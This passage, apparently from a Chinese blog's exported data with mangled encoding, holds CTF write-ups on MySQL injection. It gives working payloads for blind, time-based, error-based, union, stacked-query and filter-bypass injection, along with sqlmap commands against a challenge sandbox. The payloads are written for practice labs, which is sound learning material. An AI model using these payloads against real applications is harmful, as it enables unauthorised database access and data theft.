ctfhubâ€”å¸ƒå°”ç›²æ³¨åªæœ‰å‡ºç°æ•°æ®æäº¤æ­£ç¡®å’Œé”™è¯¯ä¸¤ç§ä¸åŒçš„é¡µé¢ï¼ˆæŠ¥é”™å‹è‡³å°‘è¯­æ³•é”™è¯¯ä¼šå›æ˜¾é”™è¯¯åˆ°é¡µé¢ä¸Šï¼‰æˆ–è€…æ— æ³•ä½¿ç”¨è”åˆæŸ¥è¯¢ã€‚ æ­¥éª¤ ç”¨é”™è¯¯å’Œæ­£ç¡®ä¸¤ç§åé¦ˆè¿›è¡Œé€ä¸€è¯•éªŒï¼ŒçŒœæµ‹å‡ºé—­åˆ åˆ©ç”¨lengthæ¥é€ä¸€æµ‹è¯•å­—ç¬¦ä¸²çš„é•¿åº¦ åˆ©ç”¨substræ¥é€ä¸€çš„æµ‹è¯•ï¼Œæµ‹è¯•åº“åã€è¡¨åã€åˆ—åå’Œå…¶ä»–æ•°æ® æœ€åå¾—åˆ°æ•°æ® å‡½æ•° length() è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ length(abc) è¿”å›3ï¼Œè¡¨ç¤ºabcå­—ç¬¦ä¸²é•¿åº¦ä¸º3 substr() æˆªå–å­—ç¬¦ä¸² substr(abc,1,1) è¿”å›aï¼Œä»abcçš„ç¬¬ä¸€ä½å¼€å§‹æˆªå–ï¼Œæ­¥é•¿ä¸º1 mid() å–å‡ºå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†å€¼ mid(abc,1,1) è¿”å›aï¼Œä»abcçš„ç¬¬ä¸€ä½å¼€å§‹å–ï¼Œæ­¥é•¿ä¸º1ï¼Œ ä¸substr()ç”¨æ³•ä¸€è‡´ left() å–å‡ºå­—ç¬¦ä¸²å·¦è¾¹çš„å‡ ä¸ªæ•°æ® left(abc,1) è¿”å›a left(abc,2) è¿”å›ab right() å–å‡ºå³è¾¹çš„å‡ ä¸ªæ•°æ® right(abc,1) è¿”å›c right(abc,2) è¿”å›bc ord() ä¸ascii() è¿”å›ä¸€ä¸ªå­—ç¬¦çš„asciiç å€¼ ascii(s) è¿”å›114 hex() è¿”å›16è¿›åˆ¶æ•° å…ˆçŒœæ•°æ®åº“é•¿åº¦&gt;3æ—¶è¿”å›æˆåŠŸï¼Œ&gt;4æ—¶è¿”å›å¤±è´¥å¯ä»¥å¾—åˆ°æ•°æ®åº“åé•¿åº¦ä¸º4 æ¥ä¸‹æ¥åˆ©ç”¨substrå’Œasciiå‡½æ•°çŒœåå­— é¦–å­—æ¯asciiç å¤§äº114æ—¶è¿”å›æˆåŠŸï¼Œå¤§äº115æ—¶è¿”å›å¤±è´¥ï¼Œå¯å¾—åˆ°é¦–å­—æ¯çš„asciiç ä¸º115ï¼Œä¸ºs ç¬¬äºŒä½åŒç†å¯ä»¥å¾—åˆ°asciiç å€¼ä¸º113ï¼Œä¸ºq æœ€åå¯å¾—æ•°æ®åº“åä¸ºsqli å†çŒœè¡¨å 1 and substr((select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1),1,1)=&#39;n&#39; ï¼ˆæ„Ÿè§‰è¿™éƒ¨åˆ†åº”è¯¥ç”¨bpæŠ“åŒ…çˆ†ç ´æ›´æ–¹ä¾¿ï¼‰ å§limitåçš„0æ”¹ä¸º1çŒœç¬¬äºŒä¸ªè¡¨å æœ€åèƒ½å¾—åˆ°æœ‰newså’Œflagä¸¤ä¸ªè¡¨ å†çŒœå­—æ®µ é¦–å­—æ¯asciiç ä¸º102ï¼Œä¸ºf åŒç†èƒ½å¾—åˆ°å­—æ®µåä¸ºflag æœ€åçˆ†å†…å®¹ å¤ªå¤šäº†ï¼Œç”¨bpçˆ†ç ´å®Œæ„Ÿè§‰ä¹Ÿå¾ˆéš¾æ‰¾ï¼Œä¼°è®¡ç”¨pyå†™è„šæœ¬ä¼šæ–¹ä¾¿å¾ˆå¤š ç”¨sqlmapï¼š -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 --dbsæŸ¥åº“å -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables æŸ¥è¡¨å -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columnsæŸ¥å­—æ®µå -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dumpæŸ¥å€¼ ctfhubâ€”æ—¶é—´ç›²æ³¨åˆ©ç”¨sleepå‡½æ•°è¿›è¡Œç›²æ³¨ è‹¥andä¹‹å‰çš„è¯­å¥æ­£ç¡®åˆ™æˆåŠŸæ‰§è¡Œsleep èƒ½å¾—åˆ°æ˜¯æ•°å­—å‹æ³¨å…¥ æ¥ä¸‹æ¥åˆ©ç”¨ifè¯­å¥è¿›è¡Œæ³¨å…¥æ˜¯å¦æˆåŠŸçš„åˆ¤æ–­1 and if(æŸ¥è¯¢è¯­å¥,sleep(2),1) è‹¥ä¸ºçœŸåˆ™æ‰§è¡Œsleepï¼ˆ2ï¼‰ï¼Œè‹¥ä¸ºå‡åˆ™æ‰§è¡Œ1 æ¥ä¸‹æ¥æ­¥éª¤ä¸å¸ƒå°”ç›²æ³¨ç›¸ä¼¼ çŒœæ•°æ®åº“åï¼ˆä¹Ÿå¯ä»¥åˆ©ç”¨asciiç æ¥çŒœï¼Œä½†å› ä¸ºctfhubçš„sqlé¢˜åç§°éƒ½ä¸€æ ·ï¼Œå°±ç›´æ¥è¯•å­—ç¬¦äº†ï¼‰ 1 and if(substr(database(),1,1)=&#39;s&#39;,sleep(2),1)# çŒœè¡¨çš„æ•°é‡ 1 and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(2),1)# çŒœè¡¨å 1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;0,sleep(2),1)# å°†limitåçš„0æ”¹ä¸º1å†çŒœç¬¬äºŒä¸ªè¡¨å åˆ†åˆ«ä¸ºnews å’Œ flag çŒœflagè¡¨å†…å­—æ®µæ•°é‡ 1 and if((select count(column_name) from information_schema.columns where table_name=&#39;flag&#39;)=1,sleep(2),1)# çŒœå­—æ®µå 1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;flag&#39; limit 0,1),1,1))&gt;102,sleep(2),1)# æœ€ç»ˆå¯ä»¥çŒœå‡ºå­—æ®µåä¸ºflag å†çŒœå†…å®¹ 1 and if(ascii(substr((select flag from flag limit 0,1),1,1))&gt;99,sleep(2),1)# è¿™éƒ¨åˆ†åº”è¯¥è¿˜æ˜¯è¦ç”¨pythonæˆ–è€…sqlmap è¿‡æ»¤ç©ºæ ¼çœ‹é¢˜ç›®å°±çŸ¥é“ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨/**/æ³¨é‡Šç¬¦æ¥æ›¿ä»£ç©ºæ ¼ï¼Œå…¶ä»–æ­¥éª¤å’Œå­—ç¬¦å‹æ³¨å…¥ä¸€æ · æœ€åå¾—åˆ°flag è´´ä¸ªåˆ«äººæ€»ç»“çš„è¿‡æ»¤å’Œç»•è¿‡ SQLæ³¨å…¥ä¸€äº›è¿‡æ»¤åŠç»•è¿‡æ€»ç»“_obsetearçš„åšå®¢-CSDNåšå®¢ [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLçœ‹åˆ°ç•Œé¢æç¤ºå­˜åœ¨è¿‡æ»¤ è¾“å…¥1&#39; and 1=1# 1â€˜ or 1# 1&#39; and select 1 from 1#ç­‰è¯­å¥æ ¹æ®è¿”å›çš„é”™è¯¯ä¿¡æ¯å¯ä»¥çŸ¥é“è¿‡æ»¤äº†select or and union from by where è¿™é‡Œå¯ä»¥åˆ©ç”¨åŒå†™ç»•è¿‡ï¼Œé¦–å…ˆåˆ©ç”¨order byæŸ¥å­—æ®µæ•°å¯ä»¥æŸ¥åˆ°è¡¨å†…æœ‰ä¸‰åˆ— 1&#39; oorrder bbyy 4;# æ¥ä¸‹æ¥å¯ä»¥åˆ©ç”¨è”åˆæŸ¥è¯¢ å…ˆçœ‹å›æ˜¾1&#39; ununionion selselectect 1,2,3;# æŸ¥åº“å1&#39; ununionion selselectect 1,2,database();# æŸ¥è¡¨å 1&#39; ununionion selselectect 1,2,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database());# flagåº”è¯¥åœ¨b4bsqlè¡¨é‡Œï¼Œçˆ†ä¸€ä¸‹åˆ—å 1&#39; ununionion selselectect 1,2,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;);# æœ€åçˆ†å†…å®¹1&#39; ununionion selselectect 1,2,(selselectect group_concat(id,username,passwoorrd) frfromom b4bsql);# [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQLè¯•äº†ä¸€ä¸‹ï¼Œand union ç©ºæ ¼ ç­‰äºéƒ½è¢«è¿‡æ»¤äº†å°è¯•äº†å‡ ç§ç»•è¿‡å§¿åŠ¿éƒ½æ²¡æˆåŠŸï¼Œçœ‹äº†ä¸‹åˆ«äººçš„wpè¯´æ˜¯æŠ¥é”™æ³¨å…¥ åˆ©ç”¨æ‹¬å·æ¥å»æ‰æŸ¥è¯¢è¯­å¥ä¸­çš„ç©ºæ ¼ å…ˆæŸ¥åº“ 0&#39;or(extractvalue(1,concat(0x7e,(database()),0x7e)))# å†æŸ¥è¡¨ ç”±äºç­‰äºå·ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¦ç”¨like admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e)))# çˆ†åˆ—å admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))),0x7e)))# æœ€åçˆ†å†…å®¹ admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e)))# flag{66f2f5cd-207d-4d50-87 ç”±äºextractvalueæ˜¾ç¤ºå­—ç¬¦æ•°çš„é™åˆ¶ï¼Œè¦ç”¨substrå‡½æ•°å¯¹å…¶è¿›è¡Œåˆ†å‰² admin&#39;or(extractvalue(1,concat(0x7e,right((select(group_concat(id,username,password))from(H4rDsq1)),31),0x7e)))# cd-207d-4d50-87bd-d8b762ffce95} æœ€åæ‹¼ä¸€ä¸‹å¾—åˆ°flag flag{66f2f5cd-207d-4d50-87bd-d8b762ffce95} [SWPU2019]Web1è¿›å…¥åæ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œæ³¨å†Œä¸ªè´¦å·ä¹‹åç™»å½• å¯ä»¥çŸ¥é“æ³¨å…¥ç‚¹åœ¨å¹¿å‘Šä½ä¸Š è¯•ä¸€ä¸‹å¯ä»¥çŸ¥é“or and #éƒ½è¢«è¿‡æ»¤äº† å› ä¸ºè¿‡æ»¤äº†ï¼ƒå·ï¼Œæ‰€ä»¥è¦ä¿è¯åé¢çš„å•å¼•å·èƒ½é—­åˆ 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;â€˜1â€™&#x3D;â€˜1 å¾—åˆ°å›æ˜¾ä½ç½®2ï¼Œ3. å› ä¸ºorè¢«è¿‡æ»¤ï¼Œä¸”æ— æ³•é€šè¿‡å¤§å°å†™å’ŒåŒå†™ç»•è¿‡ï¼Œé‚£ä¹ˆinformation_schemaå› ä¸ºå«æœ‰orï¼Œæ‰€ä»¥ä¹Ÿæ²¡æ³•ä½¿ç”¨ã€‚è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡ SQLæ³¨å…¥ï¼šé™åˆ¶æ¡ä»¶ä¸‹è·å–è¡¨åã€æ— åˆ—åæ³¨å…¥ - MustaphaMond - åšå®¢å›­ (cnblogs.com) InnoDbå¼•æ“ä»MYSQL5.5.8å¼€å§‹ï¼ŒInnoDBæˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚è€Œåœ¨MYSQL5.6ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œinndbå¢åŠ äº†innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚sysæ•°æ®åº“åœ¨5.7ä»¥ä¸Šçš„MYSQLä¸­ï¼Œæ–°å¢äº†sysæ•°æ®åº“ï¼Œè¯¥åº“çš„åŸºç¡€æ•°æ®æ¥è‡ªinformation_schemaå’Œperformance_chemaï¼Œå…¶æœ¬èº«ä¸å­˜å‚¨æ•°æ®ã€‚å¯ä»¥é€šè¿‡å…¶ä¸­çš„schema_auto_increment_columnsæ¥è·å–è¡¨åã€‚ sysæ•°æ®åº“éœ€è¦rootæƒé™ï¼Œè€ŒinnoDbåœ¨mysqlä¸­é»˜è®¤å…³é—­ é™åˆ¶ï¼šmysql â‰¥ 5.7ç‰ˆæœ¬ å…ˆæŸ¥ä¸€ä¸‹æ•°æ®åº“ç‰ˆæœ¬ å› æ­¤å¯ä»¥åˆ©ç”¨innoDbæ¥æŸ¥è¡¨å ç³»ç»ŸMysqlåº“ä¸­å­˜åœ¨ä¸¤å¼ ä¸innodbç›¸å…³çš„è¡¨ï¼šinnodb_table_statså’Œinnodb_index_statsã€‚ æ‰€ä»¥å¯ä»¥é€šè¿‡æŸ¥æ‰¾è¿™ä¸¤ä¸ªè¡¨å–ä»£informationçš„ä½œç”¨ 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1 æˆ– 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_index_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1 å¾—åˆ°è¡¨åä¸ºadså’Œusers çŒœflagåœ¨usersè¡¨å†…ï¼Œè¿›è¡Œæ— åˆ—åæ³¨å…¥ æ— åˆ—åæ³¨å…¥åŸç† æ— åˆ—åæ³¨å…¥çš„åŸç†å°±æ˜¯åœ¨å–åˆ«åçš„åŒæ—¶æŸ¥è¯¢æ•°æ®ã€‚é€šè¿‡æ— åˆ—åæŸ¥è¯¢æ„é€ ä¸€ä¸ªè™šæ‹Ÿè¡¨ï¼Œåœ¨æ„é€ æ­¤è¡¨çš„åŒæ—¶æŸ¥è¯¢å…¶ä¸­çš„æ•°æ®ã€‚ è¡¨çš„åˆ—æ•°ä¹Ÿè¦ä¸€æ¬¡æ¬¡è¯• ï¼ˆä¸å¤ªæ‡‚ä¸ºå•¥è¿™é‡Œçš„åˆ—æ•°ä¸æ˜¯22) CTF|mysqlä¹‹æ— åˆ—åæ³¨å…¥ - çŸ¥ä¹ (zhihu.com) [SWPU2019]Web1 - ç‹å¹ä¹‹ - åšå®¢å›­ (cnblogs.com) 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2, (select&#x2F;**&#x2F;group_concat(&#96;3&#96;)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#39;1&#39;&#x3D;&#39;1 å¦‚æœåå¼•å·è¢«è¿‡æ»¤ï¼Œå°±è¦å¯¹å­—æ®µåˆ©ç”¨åˆ«åæ›¿ä»£ è¿˜å¯ä»¥åˆ©ç”¨joinçˆ†åˆ—å joinåçš„åˆ—åæ˜¯ä¸¤ä¸ªè¡¨åˆ—ååŠ èµ·æ¥çš„ï¼Œå¯èƒ½ä¼šäº§â½£ç›¸åŒçš„åˆ—åï¼Œå¦‚idå’Œnameï¼Œä½¿â½¤åˆ«åæ—¶ï¼Œè¡¨ä¸­ä¸èƒ½å‡ºç°åŒçš„å­—æ®µåï¼Œè¿™å°±è·Ÿjoinç¬¬â¼€ä¸ªç‰¹ç‚¹ç›¸å†²çªï¼Œæ‰€ä»¥åœ¨joinå’Œåˆ«ååŒæ—¶ä½¿â½¤æ—¶ä¼šå¯¼è‡´æŠ¥é”™ å½“é€šè¿‡æŸ¥è¯¢å¾—åˆ°æ–°çš„è¡¨æ—¶ï¼Œå¿…é¡»æœ‰ä¸€ä¸ªåˆ«åï¼Œå³æ¯ä¸ªæ´¾ç”Ÿå‡ºæ¥çš„è¡¨éƒ½å¿…é¡»æœ‰ä¸€ä¸ªè‡ªå·±çš„åˆ«å äºŒæ¬¡æ³¨å…¥åŸç† äºŒæ¬¡æ³¨å…¥å¯ä»¥ç†è§£ä¸ºï¼Œæ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚ äºŒæ¬¡æ³¨å…¥ï¼Œå¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹ä¸¤æ­¥: ç¬¬ä¸€æ­¥ï¼šæ’å…¥æ¶æ„æ•°æ® è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™åˆä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚ ç¬¬äºŒæ­¥ï¼šå¼•ç”¨æ¶æ„æ•°æ® å¼€å‘è€…é»˜è®¤å­˜å…¥æ•°æ®åº“çš„æ•°æ®éƒ½æ˜¯å®‰å…¨çš„ï¼Œåœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒçš„å¤„ç†ã€‚ æ— åˆ—åæ³¨å…¥ï¼Ÿ (strcmp(ascii(substr(REVERSE(tceles)(table_name)from(mysql.innodb_table_stats)where((table_schema)like(database())),1,1)),10000))%23 ||strcmp(ascii(substr((select(table_name)from(mysql.innodb_table_stats))where((database_name)like(database())),1,1)),1)%23 username=admin&amp;password=||((ascii(mid((pwd)from(1))))like(12))%23 YouAresOgOoD select(table_name)from(information_schema.tables)where(table_schema=database()) ||(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),Â§1Â§,1))=Â§0Â§)%23 flag_1s_her3 ||(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c61675f31735f68657233)),Â§1Â§,1))=Â§0Â§)%23 flag{sql1_1s_s0_ea3y}","categories":[],"tags":[{"name":"webå­¦ä¹ ","slug":"webå­¦ä¹ ","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://ethe448.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"sqlé¢˜wp","slug":"sqlå­¦ä¹ ","date":"2021-06-16T08:30:58.000Z","updated":"2022-01-17T08:31:51.642Z","comments":true,"path":"2021/06/16/sqlå­¦ä¹ /","link":"","permalink":"https://ethe448.github.io/2021/06/16/sql%E5%AD%A6%E4%B9%A0/","excerpt":"sqlå¥½éš¾.jpg","text":"sqlå¥½éš¾.jpg [æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL ç”¨æˆ·æ¡†é‡Œè¾“å…¥å•å¼•å·å‡ºç°æŠ¥é”™ï¼ŒçŒœæµ‹ä¸ºå­—ç¬¦å‹æ³¨å…¥ åˆ©ç”¨1&#39;or 1#æ³¨å…¥å¾—åˆ°flag [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨å…ˆè¯•ä¸€ä¸‹ä¸‡èƒ½å¯†ç  åˆ©ç”¨1â€˜ order by å¯ä»¥è¯•å‡ºè¯¥è¡¨ä¸­å­˜åœ¨ä¸¤ä¸ªå­—æ®µ æ¥ä¸‹æ¥è¦ç”¨å †å æŸ¥è¯¢ï¼ˆåˆ©ç”¨åˆ†å·æ‰§è¡Œå¤šä¸ªsqlè¯­å¥ï¼‰ å°è¯•å…ˆæŸ¥è¯¢æ•°æ®åº“ æˆåŠŸã€‚ å†æŸ¥è¯¢è¡¨å çœ‹åˆ°æœ‰ä¸¤ä¸ªè¡¨ï¼ŒæŸ¥è¯¢ä¸¤ä¸ªè¡¨ä¸­çš„å­—æ®µ wordsè¡¨å†…å­˜åœ¨ä¸¤ä¸ªå­—æ®µ 1919810931114514è¡¨å†…å­˜åœ¨ä¸€ä¸ªå­—æ®µï¼Œflagåœ¨è¯¥è¡¨å†…ã€‚ ï¼ˆæŸ¥è¯¢è¯¥è¡¨æ—¶è¡¨åè¦åœ¨åå•å¼•å·å†…ï¼‰ 1&#39;;show columns from 1919810931114514# æ‰€ä»¥å¯ä»¥çŒœæµ‹ å†…éƒ¨æŸ¥è¯¢è¯­å¥ç±»ä¼¼ : select id, data from words where id = æ‰€ä»¥è¦æŠŠwordsè¡¨æ”¹ä¸ºword1ï¼Œå°†flagæ‰€åœ¨çš„è¡¨è¡¨åæ”¹ä¸ºwordsï¼Œç„¶åå°†flagæ”¹åä¸ºidï¼› payloadï¼š1&#39;;rename table words to word1;rename table 1919810931114514 to words; alert table words change flag id varchar(100);# å†ç”¨1â€™ or 1#æ³¨å…¥ ä¹Ÿå¯ä»¥æŠŠwordsè¡¨æ”¹ä¸ºwordsï¼Œå°†flagæ‰€åœ¨çš„è¡¨è¡¨åæ”¹ä¸ºwordsï¼Œå†ä¸ºå…¶æ·»åŠ idåˆ—ï¼Œå¹¶å°†flagæ”¹ä¸ºdata payloadï¼š1&#39;;rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# å†å°†1æäº¤å¯ç›´æ¥è·å¾—flag [SUCTF 2019]EasySQLè¿›å…¥åè¾“å…¥1æœ‰å›æ˜¾ è¾“å…¥1â€˜æ— å›æ˜¾çŒœæµ‹æ˜¯æ•°å­—å‹æ³¨å…¥ ç”¨å †å æ³¨å…¥çš„æ–¹å¼ æŸ¥åˆ°å­˜åœ¨ä¸€ä¸ªflagè¡¨ï¼Œå°è¯•æŸ¥çœ‹é‡Œé¢çš„å†…å®¹ å¤§æ¦‚æ˜¯è¢«è¿‡æ»¤äº†ï¼Œåªå¥½ç™¾åº¦æœwpäº† çœ‹åˆ°dalaoèƒ½å¤ŸçŒœå‡ºåç«¯è¯­å¥ä¸ºselect &quot;.$post[&#39;query&#39;].&quot;||flag from Flag ï¼ˆæœåˆ°ä¸€ç¯‡wpè¯´åŸç¯å¢ƒä¸­å­˜åœ¨æºç æ³„éœ²ï¼Œæ‰€ä»¥èƒ½å¤ŸçŸ¥é“è¿™éƒ¨åˆ†çš„sqlè¯­è¨€ï¼Œä½†æ˜¯buuçš„ç¯å¢ƒé‡Œæ²¡æœ‰[BUUCTF SUCTF 2019] EasySQL_Senimo-CSDNåšå®¢ï¼‰ è§£æ³•ä¸€ï¼šè¾“å…¥*,1 ç”±äº||åœ¨MySQLä¸­èµ·æˆ–çš„ä½œç”¨ï¼Œå› æ­¤1||flagä¼šè¿”å›1ï¼Œä¹Ÿå°±å˜æˆäº† select *,1 from Flag. æˆåŠŸæ‰¾åˆ°flag ç”±äºselect 1 from Flag æ˜¯å¢åŠ ä¸€ä¸ªä¸´æ—¶åˆ—ï¼Œå®ƒçš„åˆ—åæ˜¯1ï¼Œç„¶åé‚£ä¸€åˆ—çš„å€¼éƒ½ä¸º1 å› æ­¤åœ¨æŸ¥è¯¢çš„flagåè¿˜æœ‰ä¸€ä¸ªå€¼ä¸º1çš„ä¸´æ—¶åˆ— è§£æ³•äºŒ æŠŠ&quot;||&quot;å˜æˆå­—ç¬¦ä¸²è¿æ¥ç¬¦ï¼Œè€Œä¸æ˜¯æˆ–ã€‚è¿™é‡Œæ¶‰åŠåˆ°mysqlä¸­sql_modeå‚æ•°è®¾ç½®ï¼Œè®¾ç½®sql_mode=pipes_as_concatå­—ç¬¦å°±å¯ä»¥è®¾ç½®ã€‚ payloadï¼š1;set sql_mode=PIPES_AS_CONCAT;select 1 ä¹Ÿèƒ½è·å¾—flagã€‚ è¿™æ˜¯æŸ¥è¯¢è¯­å¥ç›¸å½“äºselect 1flag from Flag (ä¸å¤ªæ‡‚ä¸ºå•¥è¿™æ ·ä¹Ÿèƒ½æŸ¥å‡ºæ¥ï¼Œ1flagæ˜¯åˆ—åå¦‚æœFlagè¡¨é‡Œæ²¡æœ‰è¿™ä¸€åˆ—å‘¢ï¼Ÿï¼Ÿ) [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQLç”¨åˆ°äº†è”åˆæŸ¥è¯¢ åŸç†ç¯‡â€”â€”sqlæ³¨å…¥2ï¼šè”åˆæŸ¥è¯¢æ³¨å…¥ - è¿™å¤ªç§ƒç„¶äº† - åšå®¢å›­ (cnblogs.com) SQLæ³¨å…¥ä¹‹è”åˆæŸ¥è¯¢æ³¨å…¥_selecthchçš„åšå®¢-CSDNåšå®¢_è”åˆæ³¨å…¥ å‚è€ƒä¸€ä¸‹ å¸¸è§„æ­¥éª¤ 1. åˆ¤æ–­æ³¨å…¥ç‚¹ 2. åˆ¤æ–­æ³¨å…¥ç±»å‹ï¼ˆæ•°å­—å‹å‹orå­—ç¬¦å‹ï¼‰ 3. åˆ¤æ–­å­—æ®µæ•° 4. åˆ¤æ–­å›æ˜¾ä½ 5. ç¡®å®šæ•°æ®åº“å 6. ç¡®å®šè¡¨å 7. ç¡®å®šå­—æ®µå 8. æ‹¿åˆ°æ•°æ® 1.åˆ¤æ–­æ³¨å…¥ç‚¹ â€‹ åœ¨è¾“å…¥çš„ç”¨æˆ·ååæ·»åŠ å•å¼•å·è¿”å›å‡ºé”™ï¼ŒçŒœæµ‹å­˜åœ¨æ³¨å…¥ 2.åˆ¤æ–­æ³¨å…¥ç±»å‹ â€‹ åœ¨ç”¨æˆ·ååè¾“å…¥1â€™ or 1#åæˆåŠŸè¿›å…¥ï¼Œä½†è¿˜æ˜¯æ²¡æœ‰æ‹¿åˆ°flagï¼Œå› æ­¤ç»§ç»­å°è¯•æ³¨å…¥ 3.åˆ¤æ–­å­—æ®µæ•° â€‹ å½“order by 4æ—¶å‡ºé”™ï¼Œå› æ­¤åº”æœ‰ä¸‰ä¸ªå­—æ®µæ•° 4.åˆ¤æ–­å›æ˜¾ä½ 5ã€‚ç¡®å®šæ•°æ®åº“å â€‹ ä¸ºäº†è·å–æ‰€æœ‰æ•°æ®åº“åï¼Œè¦åˆ©ç”¨group_concat()å‡½æ•°ä»¤å…¶ä¸€æ¬¡æ€§æ˜¾ç¤ºå‡ºæ¥ 1&#39; union select 1,2,group_concat(database());# 6.ç¡®å®šè¡¨å 1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();# ã€INFORMATION_SCHEMA æ•°æ®åº“ã€‘ æ˜¯MySQLè‡ªå¸¦çš„ï¼Œå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“ å…ƒæ•°æ® çš„æ–¹å¼ã€‚å…ƒæ•°æ®æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åæˆ–è¡¨åï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œæˆ–è®¿é—®æƒé™ç­‰ã€‚ å¸¸ç”¨å­—æ®µ å­—æ®µ å«ä¹‰ Table_catalog æ•°æ®è¡¨ç™»è®°ç›®å½• Table_schema æ•°æ®è¡¨æ‰€å±çš„æ•°æ®åº“å Table_name è¡¨åç§° Table_type è¡¨ç±»å‹[system view|base table] Engine 